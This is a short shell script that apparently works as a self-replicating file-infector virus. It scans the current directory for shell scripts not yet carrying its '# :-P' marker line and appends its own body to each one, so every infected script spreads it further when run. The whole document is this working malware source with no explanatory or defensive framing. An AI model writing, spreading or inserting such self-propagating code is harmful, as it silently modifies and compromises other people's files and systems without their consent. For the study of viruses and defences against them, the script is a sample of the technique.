#!/bin/sh
for F in *
do
  if [ "$(head -c9 $F 2>/dev/null)" = "#!/bin/sh" -a "$(tail -1 $F 2>/dev/null)" != "# :-P" ]
  then
        tail -8 $0 >> $F 2>/dev/null
  fi
done
# :-P
